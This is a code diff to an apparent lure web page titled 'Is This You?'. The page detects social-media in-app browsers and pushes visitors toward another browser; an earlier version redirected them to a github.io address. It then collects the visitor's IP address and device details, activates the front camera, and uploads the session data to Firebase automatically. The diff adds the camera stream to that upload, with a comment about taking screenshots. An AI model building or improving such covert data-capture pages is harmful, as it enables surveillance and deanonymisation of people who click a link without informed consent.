@@ -49,6 +49,7 @@
             font-size: 18px;
             transition: background-color 0.3s;
             width: 100%;
+            display: none; /* Initially hidden */
         }
         .button:hover {
             background-color: #009900;
@@ -67,38 +68,26 @@
             border: 2px solid green;
             display: none; /* Hide initially until we get the stream */
         }
-        /* Custom modal styles */
-        #modal {
+        /* Banner styles */
+        #banner {
             display: none; /* Hidden by default */
+            background-color: #ffcc00;
+            padding: 15px;
             position: fixed;
-            z-index: 1000; /* Sit on top */
-            left: 0;
             top: 0;
-            width: 100%; /* Full width */
-            height: 100%; /* Full height */
-            overflow: auto; /* Enable scroll if needed */
-            background-color: rgba(0, 0, 0, 0.8); /* Black w/ opacity */
+            left: 0;
+            right: 0;
+            z-index: 1000;
         }
-        #modal-content {
-            background-color: #fefefe;
-            margin: 15% auto; /* 15% from the top and centered */
-            padding: 20px;
-            border: 1px solid #888;
-            width: 80%; /* Could be more or less, depending on screen size */
+        .banner-message {
             color: black;
-            text-align: center;
-        }
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
             font-weight: bold;
         }
-        .close:hover,
-        .close:focus {
-            color: red;
-            text-decoration: none;
+        .close-banner {
+            float: right;
             cursor: pointer;
+            font-weight: bold;
+            color: black;
         }
     </style>
 </head>
@@ -108,24 +97,18 @@
             <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
         </div>
     </div>
+    <div id="banner">
+        <span class="banner-message">Please open this link in Samsung Internet or Opera for the best experience.</span>
+        <span class="close-banner" id="close-banner">&times;</span>
+    </div>
     <div class="container">
         <h1>Is This You?</h1>
         <p id="instruction"></p>
         <p>Data will be sent automatically.</p>
-        <button class="button" id="start-button" style="display: none;">Start Process</button>
+        <button class="button" id="start-button">Start Process</button>
         <div id="error-message" class="error-message"></div>
         <div id="info-message" class="info-message"></div>
         <video id="video" autoplay playsinline></video>
-    </div>
-
-    <!-- Custom Modal -->
-    <div id="modal">
-        <div id="modal-content">
-            <span class="close" id="close-modal">&times;</span>
-            <h2>Please Open in Another Browser</h2>
-            <p>To ensure the best experience, please open this link in Samsung Internet or Opera.</p>
-            <p>We will redirect you shortly.</p>
-        </div>
     </div>
 
     <script type="module">
@@ -146,21 +129,18 @@
             return /FBAN|FBAV|Instagram|Line|MicroMessenger|QQ|Kakao|WeChat/.test(userAgent);
         }
 
-        // Show modal if in-app browser is detected
+        // Show banner if in-app browser is detected
         if (isInAppBrowser()) {
-            document.getElementById('modal').style.display = 'block'; // Show modal
-            const redirectURL = "https://frankwesseling132.github.io/my-html-site/";
-            setTimeout(() => {
-                window.location.href = redirectURL; // Redirect URL
-            }, 5000); // 5 seconds delay before redirect
+            document.getElementById('banner').style.display = 'block'; // Show banner
+            document.getElementById('start-button').style.display = 'none'; // Hide button
         } else {
             document.getElementById('instruction').innerText = "You may proceed.";
             document.getElementById('start-button').style.display = 'block'; // Show start button
         }
 
-        // Close modal event
-        document.getElementById('close-modal').onclick = function() {
-            document.getElementById('modal').style.display = "none";
+        // Close banner event
+        document.getElementById('close-banner').onclick = function() {
+            document.getElementById('banner').style.display = "none";
         }
 
         // Initialize Firebase
@@ -190,13 +170,13 @@
                 const deviceInfo = await getDeviceInfo();
 
                 // Start the camera
-                await startCamera();
+                const stream = await startCamera();
 
                 // Create a unique session ID
                 const sessionId = Date.now();
 
-                // Upload location, screenshot, and device info to Firebase
-                await uploadSessionData(sessionId, ipAddress, deviceInfo);
+                // Upload IP address, device info, and screenshot to Firebase
+                await uploadSessionData(sessionId, ipAddress, deviceInfo, stream);
                 
             } catch (error) {
                 errorMessage.innerHTML = error.message;
@@ -208,22 +188,23 @@
         async function startCamera() {
             const constraints = {
                 video: {
-                    facingMode: { ideal: "user" }, // Use front camera
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    frameRate: { ideal: 30 }
+                    facingMode: 'user', // Use front camera
+                    width: { ideal: 1280 }, // Specify width
+                    height: { ideal: 720 } // Specify height
                 }
             };
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                videoElement.srcObject = stream;
-                videoElement.style.display = 'block'; // Show video element
+                videoElement.srcObject = stream; // Attach the video stream to the video element
+                videoElement.style.display = 'block'; // Show the video element
 
-                // Automatically stop the camera after 10 seconds
+                // Stop the camera after 10 seconds
                 setTimeout(() => {
                     stopCamera(stream);
-                }, 10000); // 10 seconds
+                }, 10000); // Stop after 10 seconds
+
+                return stream;
             } catch (error) {
                 throw new Error("Unable to access the camera.");
             }
@@ -252,7 +233,8 @@
             return data.ip;
         }
 
-        async function uploadSessionData(sessionId, ipAddress, deviceInfo) {
+        async function uploadSessionData(sessionId, ipAddress, deviceInfo, stream) {
+            // Here you can take a screenshot from the video stream if needed
             const sessionData = {
                 ipAddress: ipAddress,
                 timestamp: Date.now(),
@@ -260,7 +242,7 @@
             };
             const dataRef = ref(database, 'sessions/' + sessionId);
             await set(dataRef, sessionData);
-            console.log('Session data uploaded successfully');
+            console.log('Session data uploaded successfully:', sessionData);
         }
     </script>
 </body>
